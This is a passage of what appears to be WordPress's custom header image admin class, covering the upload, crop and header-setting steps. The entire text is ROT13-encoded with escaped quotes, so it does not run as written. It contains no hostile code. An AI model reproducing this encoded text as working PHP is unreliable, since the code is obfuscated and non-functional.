			<?cuc fhozvg_ohggba( _k( 'Hcybnq', 'ireo' ), '', 'fhozvg', snyfr ); ?>
	</c>
			<?cuc
			$zbqny_hcqngr_uers = nqq_dhrel_net(
				neenl(
					'cntr'                          => 'phfgbz-urnqre',
					'fgrc'                          => 2,
					'_jcabapr-phfgbz-urnqre-hcybnq' => jc_perngr_abapr( 'phfgbz-urnqre-hcybnq' ),
				),
				nqzva_hey( 'gurzrf.cuc' )
			);
			?>
	<c>
		<ynory sbe=\"pubbfr-sebz-yvoenel-yvax\"><?cuc _r( 'Be pubbfr na vzntr sebz lbhe zrqvn yvoenel:' ); ?></ynory><oe />
		<ohggba vq=\"pubbfr-sebz-yvoenel-yvax\" pynff=\"ohggba\"
			qngn-hcqngr-yvax=\"<?cuc rpub rfp_hey( $zbqny_hcqngr_uers ); ?>\"
			qngn-pubbfr=\"<?cuc rfp_ngge_r( 'Pubbfr n Phfgbz Urnqre' ); ?>\"
			qngn-hcqngr=\"<?cuc rfp_ngge_r( 'Frg nf urnqre' ); ?>\"><?cuc _r( 'Pubbfr Vzntr' ); ?></ohggba>
	</c>
	</sbez>
</gq>
</ge>
		<?cuc raqvs; ?>
</gobql>
</gnoyr>

<sbez zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( nqq_dhrel_net( 'fgrc', 1 ) ); ?>\">
		<?cuc fhozvg_ohggba( ahyy, 'fperra-ernqre-grkg', 'fnir-urnqre-bcgvbaf', snyfr ); ?>
<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<gobql>
		<?cuc vs ( trg_hcybnqrq_urnqre_vzntrf() ) : ?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Hcybnqrq Vzntrf' ); ?></gu>
<gq>
	<c><?cuc _r( 'Lbh pna pubbfr bar bs lbhe cerivbhfyl hcybnqrq urnqref, be fubj n enaqbz bar.' ); ?></c>
			<?cuc
			$guvf->fubj_urnqre_fryrpgbe( 'hcybnqrq' );
			?>
</gq>
</ge>
			<?cuc
	raqvs;
		vs ( ! rzcgl( $guvf->qrsnhyg_urnqref ) ) :
			?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Qrsnhyg Vzntrf' ); ?></gu>
<gq>
			<?cuc vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'hcybnqf' ) ) : ?>
	<c><?cuc _r( 'Vs lbh qb abg jnag gb hcybnq lbhe bja vzntr, lbh pna hfr bar bs gurfr pbby urnqref, be fubj n enaqbz bar.' ); ?></c>
	<?cuc ryfr : ?>
	<c><?cuc _r( 'Lbh pna hfr bar bs gurfr pbby urnqref be fubj n enaqbz bar ba rnpu cntr.' ); ?></c>
	<?cuc raqvs; ?>
			<?cuc
			$guvf->fubj_urnqre_fryrpgbe( 'qrsnhyg' );
			?>
</gq>
</ge>
			<?cuc
	raqvs;
		vs ( trg_urnqre_vzntr() ) :
			?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Erzbir Vzntr' ); ?></gu>
<gq>
	<c><?cuc _r( 'Guvf jvyy erzbir gur urnqre vzntr. Lbh jvyy abg or noyr gb erfgber nal phfgbzvmngvbaf.' ); ?></c>
			<?cuc fhozvg_ohggba( __( 'Erzbir Urnqre Vzntr' ), '', 'erzbirurnqre', snyfr ); ?>
</gq>
</ge>
			<?cuc
	raqvs;

		$qrsnhyg_vzntr = fcevags(
			trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-vzntr' ),
			trg_grzcyngr_qverpgbel_hev(),
			trg_fglyrfurrg_qverpgbel_hev()
		);

		vs ( $qrsnhyg_vzntr && trg_urnqre_vzntr() !== $qrsnhyg_vzntr ) :
			?>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Erfrg Vzntr' ); ?></gu>
<gq>
	<c><?cuc _r( 'Guvf jvyy erfgber gur bevtvany urnqre vzntr. Lbh jvyy abg or noyr gb erfgber nal phfgbzvmngvbaf.' ); ?></c>
			<?cuc fhozvg_ohggba( __( 'Erfgber Bevtvany Urnqre Vzntr' ), '', 'erfrgurnqre', snyfr ); ?>
</gq>
</ge>
	<?cuc raqvs; ?>
</gobql>
</gnoyr>

		<?cuc vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urnqre-grkg' ) ) : ?>

<u2><?cuc _r( 'Urnqre Grkg' ); ?></u2>

<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
<gobql>
<ge>
<gu fpbcr=\"ebj\"><?cuc _r( 'Urnqre Grkg' ); ?></gu>
<gq>
	<c>
	<ynory><vachg glcr=\"purpxobk\" anzr=\"qvfcynl-urnqre-grkg\" vq=\"qvfcynl-urnqre-grkg\"<?cuc purpxrq( qvfcynl_urnqre_grkg() ); ?> /> <?cuc _r( 'Fubj urnqre grkg jvgu lbhe vzntr.' ); ?></ynory>
	</c>
</gq>
</ge>

<ge pynff=\"qvfcynlvat-urnqre-grkg\">
<gu fpbcr=\"ebj\"><?cuc _r( 'Grkg Pbybe' ); ?></gu>
<gq>
	<c>
			<?cuc
			$qrsnhyg_pbybe = '';
			vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' ) ) {
				$qrsnhyg_pbybe = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' );
				vs ( $qrsnhyg_pbybe && ! fge_pbagnvaf( $qrsnhyg_pbybe, '#' ) ) {
					$qrsnhyg_pbybe = '#' . $qrsnhyg_pbybe;
				}
			}

			$qrsnhyg_pbybe_ngge = $qrsnhyg_pbybe ? ' qngn-qrsnhyg-pbybe=\"' . rfp_ngge( $qrsnhyg_pbybe ) . '\"' : '';

			$urnqre_grkgpbybe = qvfcynl_urnqre_grkg() ? trg_urnqre_grkgpbybe() : trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' );
			vs ( $urnqre_grkgpbybe && ! fge_pbagnvaf( $urnqre_grkgpbybe, '#' ) ) {
				$urnqre_grkgpbybe = '#' . $urnqre_grkgpbybe;
			}

			rpub '<vachg glcr=\"grkg\" anzr=\"grkg-pbybe\" vq=\"grkg-pbybe\" inyhr=\"' . rfp_ngge( $urnqre_grkgpbybe ) . '\"' . $qrsnhyg_pbybe_ngge . ' />';
			vs ( $qrsnhyg_pbybe ) {
				/* genafyngbef: %f: Qrsnhyg grkg pbybe. */
				rpub ' <fcna pynff=\"qrfpevcgvba uvqr-vs-wf\">' . fcevags( _k( 'Qrsnhyg: %f', 'pbybe' ), rfp_ugzy( $qrsnhyg_pbybe ) ) . '</fcna>';
			}
			?>
	</c>
</gq>
</ge>
</gobql>
</gnoyr>
			<?cuc
raqvs;

		/**
		 * Sverf whfg orsber gur fhozvg ohggba va gur phfgbz urnqre bcgvbaf sbez.
		 *
		 * @fvapr 3.1.0
		 */
		qb_npgvba( 'phfgbz_urnqre_bcgvbaf' );

		jc_abapr_svryq( 'phfgbz-urnqre-bcgvbaf', '_jcabapr-phfgbz-urnqre-bcgvbaf' );
		?>

		<?cuc fhozvg_ohggba( ahyy, 'cevznel', 'fnir-urnqre-bcgvbaf' ); ?>
</sbez>
</qvi>

		<?cuc
	}

	/**
	 * Qvfcynlf frpbaq fgrc bs phfgbz urnqre vzntr cntr.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba fgrc_2() {
		purpx_nqzva_ersrere( 'phfgbz-urnqre-hcybnq', '_jcabapr-phfgbz-urnqre-hcybnq' );

		vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'hcybnqf' ) ) {
			jc_qvr(
				'<u1>' . __( 'Na reebe bppheerq juvyr cebprffvat lbhe urnqre vzntr.' ) . '</u1>' .
				'<c>' . __( 'Gur npgvir gurzr qbrf abg fhccbeg hcybnqvat n phfgbz urnqre vzntr. Cyrnfr rafher lbhe gurzr fhccbegf phfgbz urnqref naq gel ntnva.' ) . '</c>',
				403
			);
		}

		vs ( rzcgl( $_CBFG ) && vffrg( $_TRG['svyr'] ) ) {
			$nggnpuzrag_vq = nofvag( $_TRG['svyr'] );
			$svyr          = trg_nggnpurq_svyr( $nggnpuzrag_vq, gehr );
			$hey           = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, 'shyy' );
			$hey           = $hey[0];
		} ryfrvs ( vffrg( $_CBFG ) ) {
			$qngn          = $guvf->fgrc_2_znantr_hcybnq();
			$nggnpuzrag_vq = $qngn['nggnpuzrag_vq'];
			$svyr          = $qngn['svyr'];
			$hey           = $qngn['hey'];
		}

		vs ( svyr_rkvfgf( $svyr ) ) {
			yvfg( $jvqgu, $urvtug, $glcr, $ngge ) = jc_trgvzntrfvmr( $svyr );
		} ryfr {
			$qngn   = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq );
			$urvtug = vffrg( $qngn['urvtug'] ) ? (vag) $qngn['urvtug'] : 0;
			$jvqgu  = vffrg( $qngn['jvqgu'] ) ? (vag) $qngn['jvqgu'] : 0;
			hafrg( $qngn );
		}

		$znk_jvqgu = 0;

		// Sbe syrk, yvzvg fvmr bs vzntr qvfcynlrq gb 1500ck hayrff gurzr fnlf bgurejvfr.
		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' ) ) {
			$znk_jvqgu = 1500;
		}

		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'znk-jvqgu' ) ) {
			$znk_jvqgu = znk( $znk_jvqgu, trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'znk-jvqgu' ) );
		}

		$znk_jvqgu = znk( $znk_jvqgu, trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ) );

		// Vs syrkvoyr urvtug vfa'g fhccbegrq naq gur vzntr vf gur rknpg evtug fvmr.
		vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
			&& ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' )
			&& (vag) trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ) === $jvqgu
			&& (vag) trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' ) === $urvtug
		) {
			// Nqq gur zrgnqngn.
			vs ( svyr_rkvfgf( $svyr ) ) {
				jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr ) );
			}

			$guvf->frg_urnqre_vzntr( pbzcnpg( 'hey', 'nggnpuzrag_vq', 'jvqgu', 'urvtug' ) );

			/**
			 * Svygref gur nggnpuzrag svyr cngu nsgre gur phfgbz urnqre be onpxtebhaq vzntr vf frg.
			 *
			 * Hfrq sbe svyr ercyvpngvba.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat $svyr          Cngu gb gur svyr.
			 * @cnenz vag    $nggnpuzrag_vq Nggnpuzrag VQ.
			 */
			$svyr = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $svyr, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

			erghea $guvf->svavfurq();
		} ryfrvs ( $jvqgu > $znk_jvqgu ) {
			$bvgne = $jvqgu / $znk_jvqgu;

			$vzntr = jc_pebc_vzntr(
				$nggnpuzrag_vq,
				0,
				0,
				$jvqgu,
				$urvtug,
				$znk_jvqgu,
				$urvtug / $bvgne,
				snyfr,
				fge_ercynpr( jc_onfranzr( $svyr ), 'zvqfvmr-' . jc_onfranzr( $svyr ), $svyr )
			);

			vs ( ! $vzntr || vf_jc_reebe( $vzntr ) ) {
				jc_qvr( __( 'Vzntr pbhyq abg or cebprffrq. Cyrnfr tb onpx naq gel ntnva.' ), __( 'Vzntr Cebprffvat Reebe' ) );
			}

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
			$vzntr = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $vzntr, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

			$hey    = fge_ercynpr( jc_onfranzr( $hey ), jc_onfranzr( $vzntr ), $hey );
			$jvqgu  = $jvqgu / $bvgne;
			$urvtug = $urvtug / $bvgne;
		} ryfr {
			$bvgne = 1;
		}
		?>

<qvi pynff=\"jenc\">
<u1><?cuc _r( 'Pebc Urnqre Vzntr' ); ?></u1>

<sbez zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( nqq_dhrel_net( 'fgrc', 3 ) ); ?>\">
	<c pynff=\"uvqr-vs-ab-wf\"><?cuc _r( 'Pubbfr gur cneg bs gur vzntr lbh jnag gb hfr nf lbhe urnqre.' ); ?></c>
	<c pynff=\"uvqr-vs-wf\"><fgebat><?cuc _r( 'Lbh arrq WninFpevcg gb pubbfr n cneg bs gur vzntr.' ); ?></fgebat></c>

	<qvi vq=\"pebc_vzntr\" fglyr=\"cbfvgvba: eryngvir\">
		<vzt fep=\"<?cuc rpub rfp_hey( $hey ); ?>\" vq=\"hcybnq\" jvqgu=\"<?cuc rpub rfp_ngge( $jvqgu ); ?>\" urvtug=\"<?cuc rpub rfp_ngge( $urvtug ); ?>\" nyg=\"\" />
	</qvi>

	<vachg glcr=\"uvqqra\" anzr=\"k1\" vq=\"k1\" inyhr=\"0\" />
	<vachg glcr=\"uvqqra\" anzr=\"l1\" vq=\"l1\" inyhr=\"0\" />
	<vachg glcr=\"uvqqra\" anzr=\"jvqgu\" vq=\"jvqgu\" inyhr=\"<?cuc rpub rfp_ngge( $jvqgu ); ?>\" />
	<vachg glcr=\"uvqqra\" anzr=\"urvtug\" vq=\"urvtug\" inyhr=\"<?cuc rpub rfp_ngge( $urvtug ); ?>\" />
	<vachg glcr=\"uvqqra\" anzr=\"nggnpuzrag_vq\" vq=\"nggnpuzrag_vq\" inyhr=\"<?cuc rpub rfp_ngge( $nggnpuzrag_vq ); ?>\" />
	<vachg glcr=\"uvqqra\" anzr=\"bvgne\" vq=\"bvgne\" inyhr=\"<?cuc rpub rfp_ngge( $bvgne ); ?>\" />
		<?cuc vs ( rzcgl( $_CBFG ) && vffrg( $_TRG['svyr'] ) ) { ?>
	<vachg glcr=\"uvqqra\" anzr=\"perngr-arj-nggnpuzrag\" inyhr=\"gehr\" />
	<?cuc } ?>
		<?cuc jc_abapr_svryq( 'phfgbz-urnqre-pebc-vzntr' ); ?>

	<c pynff=\"fhozvg\">
		<?cuc fhozvg_ohggba( __( 'Pebc naq Choyvfu' ), 'cevznel', 'fhozvg', snyfr ); ?>
		<?cuc
		vs ( vffrg( $bvgne ) && 1 === $bvgne
			&& ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
				|| pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' ) )
		) {
			fhozvg_ohggba( __( 'Fxvc Pebccvat, Choyvfu Vzntr nf Vf' ), '', 'fxvc-pebccvat', snyfr );
		}
		?>
	</c>
</sbez>
</qvi>
		<?cuc
	}


	/**
	 * Hcybnqf gur svyr gb or pebccrq va gur frpbaq fgrc.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba fgrc_2_znantr_hcybnq() {
		$bireevqrf = neenl( 'grfg_sbez' => snyfr );

		$hcybnqrq_svyr = $_SVYRF['vzcbeg'];
		$jc_svyrglcr   = jc_purpx_svyrglcr_naq_rkg( $hcybnqrq_svyr['gzc_anzr'], $hcybnqrq_svyr['anzr'] );

		vs ( ! jc_zngpu_zvzr_glcrf( 'vzntr', $jc_svyrglcr['glcr'] ) ) {
			jc_qvr( __( 'Gur hcybnqrq svyr vf abg n inyvq vzntr. Cyrnfr gel ntnva.' ) );
		}

		$svyr = jc_unaqyr_hcybnq( $hcybnqrq_svyr, $bireevqrf );

		vs ( vffrg( $svyr['reebe'] ) ) {
			jc_qvr( $svyr['reebe'], __( 'Vzntr Hcybnq Reebe' ) );
		}

		$hey      = $svyr['hey'];
		$glcr     = $svyr['glcr'];
		$svyr     = $svyr['svyr'];
		$svyranzr = jc_onfranzr( $svyr );

		// Pbafgehpg gur nggnpuzrag neenl.
		$nggnpuzrag = neenl(
			'cbfg_gvgyr'     => $svyranzr,
			'cbfg_pbagrag'   => $hey,
			'cbfg_zvzr_glcr' => $glcr,
			'thvq'           => $hey,
			'pbagrkg'        => 'phfgbz-urnqre',
		);

		// Fnir gur qngn.
		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $svyr );

		erghea pbzcnpg( 'nggnpuzrag_vq', 'svyr', 'svyranzr', 'hey', 'glcr' );
	}

	/**
	 * Qvfcynlf guveq fgrc bs phfgbz urnqre vzntr cntr.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 4.4.0 Fjvgpurq gb hfvat jc_trg_nggnpuzrag_hey() vafgrnq bs gur thvq
	 *              sbe ergevrivat gur urnqre vzntr HEY.
	 */
	choyvp shapgvba fgrc_3() {
		purpx_nqzva_ersrere( 'phfgbz-urnqre-pebc-vzntr' );

		vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'hcybnqf' ) ) {
			jc_qvr(
				'<u1>' . __( 'Na reebe bppheerq juvyr cebprffvat lbhe urnqre vzntr.' ) . '</u1>' .
				'<c>' . __( 'Gur npgvir gurzr qbrf abg fhccbeg hcybnqvat n phfgbz urnqre vzntr. Cyrnfr rafher lbhe gurzr fhccbegf phfgbz urnqref naq gel ntnva.' ) . '</c>',
				403
			);
		}

		vs ( ! rzcgl( $_CBFG['fxvc-pebccvat'] )
			&& ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' )
			&& ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' )
		) {
			jc_qvr(
				'<u1>' . __( 'Na reebe bppheerq juvyr cebprffvat lbhe urnqre vzntr.' ) . '</u1>' .
				'<c>' . __( 'Gur npgvir gurzr qbrf abg fhccbeg n syrkvoyr fvmrq urnqre vzntr.' ) . '</c>',
				403
			);
		}

		vs ( $_CBFG['bvgne'] > 1 ) {
			$_CBFG['k1']     = $_CBFG['k1'] * $_CBFG['bvgne'];
			$_CBFG['l1']     = $_CBFG['l1'] * $_CBFG['bvgne'];
			$_CBFG['jvqgu']  = $_CBFG['jvqgu'] * $_CBFG['bvgne'];
			$_CBFG['urvtug'] = $_CBFG['urvtug'] * $_CBFG['bvgne'];
		}

		$nggnpuzrag_vq = nofvag( $_CBFG['nggnpuzrag_vq'] );
		$bevtvany      = trg_nggnpurq_svyr( $nggnpuzrag_vq );

		$qvzrafvbaf = $guvf->trg_urnqre_qvzrafvbaf(
			neenl(
				'urvtug' => $_CBFG['urvtug'],
				'jvqgu'  => $_CBFG['jvqgu'],
			)
		);
		$urvtug     = $qvzrafvbaf['qfg_urvtug'];
		$jvqgu      = $qvzrafvbaf['qfg_jvqgu'];

		vs ( rzcgl( $_CBFG['fxvc-pebccvat'] ) ) {
			$pebccrq = jc_pebc_vzntr(
				$nggnpuzrag_vq,
				(vag) $_CBFG['k1'],
				(vag) $_CBFG['l1'],
				(vag) $_CBFG['jvqgu'],
				(vag) $_CBFG['urvtug'],
				$jvqgu,
				$urvtug
			);
		} ryfrvs ( ! rzcgl( $_CBFG['perngr-arj-nggnpuzrag'] ) ) {
			$pebccrq = _pbcl_vzntr_svyr( $nggnpuzrag_vq );
		} ryfr {
			$pebccrq = trg_nggnpurq_svyr( $nggnpuzrag_vq );
		}

		vs ( ! $pebccrq || vf_jc_reebe( $pebccrq ) ) {
			jc_qvr( __( 'Vzntr pbhyq abg or cebprffrq. Cyrnfr tb onpx naq gel ntnva.' ), __( 'Vzntr Cebprffvat Reebe' ) );
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
		$pebccrq = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $pebccrq, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

		$nggnpuzrag = jc_pbcl_cnerag_nggnpuzrag_cebcregvrf( $pebccrq, $nggnpuzrag_vq, 'phfgbz-urnqre' );

		vs ( ! rzcgl( $_CBFG['perngr-arj-nggnpuzrag'] ) ) {
			hafrg( $nggnpuzrag['VQ'] );
		}

		// Hcqngr gur nggnpuzrag.
		$nggnpuzrag_vq = $guvf->vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq );

		$hey = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );
		$guvf->frg_urnqre_vzntr( pbzcnpg( 'hey', 'nggnpuzrag_vq', 'jvqgu', 'urvtug' ) );

		// Pyrnahc.
		$zrqvhz = fge_ercynpr( jc_onfranzr( $bevtvany ), 'zvqfvmr-' . jc_onfranzr( $bevtvany ), $bevtvany );
		vs ( svyr_rkvfgf( $zrqvhz ) ) {
			jc_qryrgr_svyr( $zrqvhz );
		}

		vs ( rzcgl( $_CBFG['perngr-arj-nggnpuzrag'] ) && rzcgl( $_CBFG['fxvc-pebccvat'] ) ) {
			jc_qryrgr_svyr( $bevtvany );
		}

		erghea $guvf->svavfurq();
	}

	/**
	 * Qvfcynlf ynfg fgrc bs phfgbz urnqre vzntr cntr.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba svavfurq() {
		$guvf->hcqngrq = gehr;
		$guvf->fgrc_1();
	}

	/**
	 * Qvfcynlf gur cntr onfrq ba gur pheerag fgrc.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba nqzva_cntr() {
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb phfgbzvmr urnqref.' ) );
		}

		$fgrc = $guvf->fgrc();

		vs ( 2 === $fgrc ) {
			$guvf->fgrc_2();
		} ryfrvs ( 3 === $fgrc ) {
			$guvf->fgrc_3();
		} ryfr {
			$guvf->fgrc_1();
		}
	}

	/**
	 * Hahfrq fvapr 3.5.0.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz neenl $sbez_svryqf
	 * @erghea neenl $sbez_svryqf
	 */
	choyvp shapgvba nggnpuzrag_svryqf_gb_rqvg( $sbez_svryqf ) {
		erghea $sbez_svryqf;
	}

	/**
	 * Hahfrq fvapr 3.5.0.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz neenl $gnof
	 * @erghea neenl $gnof
	 */
	choyvp shapgvba svygre_hcybnq_gnof( $gnof ) {
		erghea $gnof;
	}

	/**
	 * Pubbfrf n urnqre vzntr, fryrpgrq sebz rkvfgvat hcybnqrq naq qrsnhyg urnqref,
	 * be cebivqrf na neenl bs hcybnqrq urnqre qngn (rvgure arj, be sebz zrqvn yvoenel).
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz zvkrq $pubvpr Juvpu urnqre vzntr gb fryrpg. Nyybjf sbe inyhrf bs 'enaqbz-qrsnhyg-vzntr',
	 *                      sbe enaqbzyl plpyvat nzbat gur qrsnhyg vzntrf; 'enaqbz-hcybnqrq-vzntr',
	 *                      sbe enaqbzyl plpyvat nzbat gur hcybnqrq vzntrf; gur xrl bs n qrsnhyg vzntr
	 *                      ertvfgrerq sbe gung gurzr; naq gur xrl bs na vzntr hcybnqrq sbe gung gurzr
	 *                      (gur nggnpuzrag VQ bs gur vzntr). Be na neenl bs nethzragf: nggnpuzrag_vq,
	 *                      hey, jvqgu, urvtug. Nyy ner erdhverq.
	 */
	svany choyvp shapgvba frg_urnqre_vzntr( $pubvpr ) {
		vs ( vf_neenl( $pubvpr ) || vf_bowrpg( $pubvpr ) ) {
			$pubvpr = (neenl) $pubvpr;

			vs ( ! vffrg( $pubvpr['nggnpuzrag_vq'] ) || ! vffrg( $pubvpr['hey'] ) ) {
				erghea;
			}

			$pubvpr['hey'] = fnavgvmr_hey( $pubvpr['hey'] );

			$urnqre_vzntr_qngn = (bowrpg) neenl(
				'nggnpuzrag_vq' => $pubvpr['nggnpuzrag_vq'],
				'hey'           => $pubvpr['hey'],
				'guhzoanvy_hey' => $pubvpr['hey'],
				'urvtug'        => $pubvpr['urvtug'],
				'jvqgu'         => $pubvpr['jvqgu'],
			);

			hcqngr_cbfg_zrgn( $pubvpr['nggnpuzrag_vq'], '_jc_nggnpuzrag_vf_phfgbz_urnqre', trg_fglyrfurrg() );

			frg_gurzr_zbq( 'urnqre_vzntr', $pubvpr['hey'] );
			frg_gurzr_zbq( 'urnqre_vzntr_qngn', $urnqre_vzntr_qngn );

			erghea;
		}

		vs ( va_neenl( $pubvpr, neenl( 'erzbir-urnqre', 'enaqbz-qrsnhyg-vzntr', 'enaqbz-hcybnqrq-vzntr' ), gehr ) ) {
			frg_gurzr_zbq( 'urnqre_vzntr', $pubvpr );
			erzbir_gurzr_zbq( 'urnqre_vzntr_qngn' );

			erghea;
		}

		$hcybnqrq = trg_hcybnqrq_urnqre_vzntrf();

		vs ( $hcybnqrq && vffrg( $hcybnqrq[ $pubvpr ] ) ) {
			$urnqre_vzntr_qngn = $hcybnqrq[ $pubvpr ];
		} ryfr {
			$guvf->cebprff_qrsnhyg_urnqref();
			vs ( vffrg( $guvf->qrsnhyg_urnqref[ $pubvpr ] ) ) {
				$urnqre_vzntr_qngn = $guvf->qrsnhyg_urnqref[ $pubvpr ];
			} ryfr {
				erghea;
			}
		}

		frg_gurzr_zbq( 'urnqre_vzntr', fnavgvmr_hey( $urnqre_vzntr_qngn['hey'] ) );
		frg_gurzr_zbq( 'urnqre_vzntr_qngn', $urnqre_vzntr_qngn );
	}

	/**
	 * Erzbirf n urnqre vzntr.
	 *
	 * @fvapr 3.4.0
	 */
	svany choyvp shapgvba erzbir_urnqre_vzntr() {
		$guvf->frg_urnqre_vzntr( 'erzbir-urnqre' );
	}

	/**
	 * Erfrgf n urnqre vzntr gb gur qrsnhyg vzntr sbe gur gurzr.
	 *
	 * Guvf zrgubq qbrf abg qb nalguvat vs gur gurzr qbrf abg unir n qrsnhyg urnqre vzntr.
	 *
	 * @fvapr 3.4.0
	 */
	svany choyvp shapgvba erfrg_urnqre_vzntr() {
		$guvf->cebprff_qrsnhyg_urnqref();
		$qrsnhyg = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-vzntr' );

		vs ( ! $qrsnhyg ) {
			$guvf->erzbir_urnqre_vzntr();
			erghea;
		}

		$qrsnhyg = fcevags( $qrsnhyg, trg_grzcyngr_qverpgbel_hev(), trg_fglyrfurrg_qverpgbel_hev() );

		$qrsnhyg_qngn = neenl();
		sbernpu ( $guvf->qrsnhyg_urnqref nf $urnqre => $qrgnvyf ) {
			vs ( $qrgnvyf['hey'] === $qrsnhyg ) {
				$qrsnhyg_qngn = $qrgnvyf;
				oernx;
			}
		}

		frg_gurzr_zbq( 'urnqre_vzntr', $qrsnhyg );
		frg_gurzr_zbq( 'urnqre_vzntr_qngn', (bowrpg) $qrsnhyg_qngn );
	}

	/**
	 * Pnyphyngrf jvqgu naq urvtug onfrq ba jung gur pheeragyl fryrpgrq gurzr fhccbegf.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz neenl $qvzrafvbaf
	 * @erghea neenl qfg_urvtug naq qfg_jvqgu bs urnqre vzntr.
	 */
	svany choyvp shapgvba trg_urnqre_qvzrafvbaf( $qvzrafvbaf ) {
		$znk_jvqgu       = 0;
		$jvqgu           = nofvag( $qvzrafvbaf['jvqgu'] );
		$urvtug          = nofvag( $qvzrafvbaf['urvtug'] );
		$gurzr_urvtug    = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' );
		$gurzr_jvqgu     = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' );
		$unf_syrk_jvqgu  = pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-jvqgu' );
		$unf_syrk_urvtug = pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'syrk-urvtug' );
		$unf_znk_jvqgu   = pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'znk-jvqgu' );
		$qfg             = neenl(
			'qfg_urvtug' => ahyy,
			'qfg_jvqgu'  => ahyy,
		);

		// Sbe syrk, yvzvg fvmr bs vzntr qvfcynlrq gb 1500ck hayrff gurzr fnlf bgurejvfr.
		vs ( $unf_syrk_jvqgu ) {
			$znk_jvqgu = 1500;
		}

		vs ( $unf_znk_jvqgu ) {
			$znk_jvqgu = znk( $znk_jvqgu, trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'znk-jvqgu' ) );
		}
		$znk_jvqgu = znk( $znk_jvqgu, $gurzr_jvqgu );

		vs ( $unf_syrk_urvtug && ( ! $unf_syrk_jvqgu || $jvqgu > $znk_jvqgu ) ) {
			$qfg['qfg_urvtug'] = nofvag( $urvtug * ( $znk_jvqgu / $jvqgu ) );
		} ryfrvs ( $unf_syrk_urvtug && $unf_syrk_jvqgu ) {
			$qfg['qfg_urvtug'] = $urvtug;
		} ryfr {
			$qfg['qfg_urvtug'] = $gurzr_urvtug;
		}

		vs ( $unf_syrk_jvqgu && ( ! $unf_syrk_urvtug || $jvqgu > $znk_jvqgu ) ) {
			$qfg['qfg_jvqgu'] = nofvag( $jvqgu * ( $znk_jvqgu / $jvqgu ) );
		} ryfrvs ( $unf_syrk_jvqgu && $unf_syrk_urvtug ) {
			$qfg['qfg_jvqgu'] = $jvqgu;
		} ryfr {
			$qfg['qfg_jvqgu'] = $gurzr_jvqgu;
		}

		erghea $qfg;
	}

	/**
	 * Perngrf na nggnpuzrag 'bowrpg'.
	 *
	 * @fvapr 3.9.0
	 * @qrcerpngrq 6.5.0
	 *
	 * @cnenz fgevat $pebccrq              Pebccrq vzntr HEY.
